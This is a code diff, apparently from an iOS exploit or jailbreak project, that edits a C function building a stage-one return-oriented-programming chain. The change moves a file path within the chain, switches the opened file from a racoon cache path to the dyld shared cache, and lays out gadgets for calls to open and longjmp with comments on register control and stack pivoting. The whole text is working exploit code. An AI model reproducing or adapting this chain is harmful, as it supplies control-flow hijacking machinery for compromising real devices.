@@ -146,7 +146,7 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 		0x1a0478cb4      c0035fd6       ret
 
 		We will call open("/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64", O_RDONLY);
-		Path is stored at 0x70
+		Path is stored at 0x2b0
 
 		This means we need to load the address of the path into x26 at [1], x27 will contain the open func pointer and x25 O_RDONLY
 
@@ -180,8 +180,8 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 		}ints;
 	};
 	union path_union path;
-	//snprintf(&path.path,62,"/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64");
-	snprintf(&path.path,62,"/private/etc/racoon/cache");
+	snprintf(&path.path,62,"/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64");
+	//snprintf(&path.path,62,"/private/etc/racoon/cache");
 	
 
 	ROP_SETUP(offsets->stage1_ropchain);
@@ -192,21 +192,21 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	ADD_GADGET();										   // 0x20		[2] x23 [3] x3/fourth arg
 	ADD_GADGET();										   // 0x28		[2] x24 [3] x2/third arg
 	ADD_STATIC_GADGET(O_RDONLY);						   // 0x30		[2] x25 [3] x1/second arg
-	ADD_OFFSET_GADGET(0x70);							   // 0x38		[2] x26 [3] x0/first arg
+	ADD_OFFSET_GADGET(0x2b0);							   // 0x38		[2] x26 [3] x0/first arg
 	ADD_CODE_GADGET(offsets->open);						   // 0x40		[2] x27 [3] call gadget
 	ADD_GADGET();										   // 0x48		[2] x28 
 	ADD_CODE_GADGET(offsets->longjmp);					   // 0x50		[1] (next gadget) [2] 0x29 (but x29 will be overwritten later)
 	ADD_CODE_GADGET(offsets->BEAST_GADGET);				   // 0x58		[2] x30 (next gadget)
 	ADD_GADGET();										   // 0x60		[2] x29
 	ADD_OFFSET_GADGET(0xb0);							   // 0x68		[2] x2  (new stack)
-	ADD_STATIC_GADGET(path.ints.a);						   // 0x70		[2] weird Dx registers
-	ADD_STATIC_GADGET(path.ints.b);						   // 0x78		[2] weird Dx registers
-	ADD_STATIC_GADGET(path.ints.c);						   // 0x80		[2] weird Dx registers
-	ADD_STATIC_GADGET(path.ints.d);						   // 0x88		[2] weird Dx registers
-	ADD_STATIC_GADGET(path.ints.e);						   // 0x90		[2] weird Dx registers
-	ADD_STATIC_GADGET(path.ints.f);						   // 0x98		[2] weird Dx registers
-	ADD_STATIC_GADGET(path.ints.g);						   // 0xa0		[2] weird Dx registers
-	ADD_STATIC_GADGET(path.ints.h);						   // 0xa8		[2] weird Dx registers
+	ADD_GADGET();										   // 0x70		[2] weird Dx registers
+	ADD_GADGET();										   // 0x78		[2] weird Dx registers
+	ADD_GADGET();										   // 0x80		[2] weird Dx registers
+	ADD_GADGET();										   // 0x88		[2] weird Dx registers
+	ADD_GADGET();										   // 0x90		[2] weird Dx registers
+	ADD_GADGET();										   // 0x98		[2] weird Dx registers
+	ADD_GADGET();										   // 0xa0		[2] weird Dx registers
+	ADD_GADGET();										   // 0xa8		[2] weird Dx registers
 
 
 	ADD_GADGET();										   // 0xb0		[2] new stack top 
@@ -279,4 +279,14 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	ADD_GADGET();										   // 0x298		[6] x19
 	ADD_GADGET();										   // 0x2a0		[6] x29
 	ADD_UNSLID_CODE_GADGET(offsets->longjmp);			   // 0x2a8		[6] x30 (next gadget)
+
+	ADD_STATIC_GADGET(path.ints.a);						   // 0x2b0
+	ADD_STATIC_GADGET(path.ints.b);						   // 0x2b8
+	ADD_STATIC_GADGET(path.ints.c);						   // 0x2c0
+	ADD_STATIC_GADGET(path.ints.d);						   // 0x2c8
+	ADD_STATIC_GADGET(path.ints.e);						   // 0x2d0
+	ADD_STATIC_GADGET(path.ints.f);						   // 0x2d8
+	ADD_STATIC_GADGET(path.ints.g);						   // 0x2e0
+	ADD_STATIC_GADGET(path.ints.h);						   // 0x2e8
+
 }
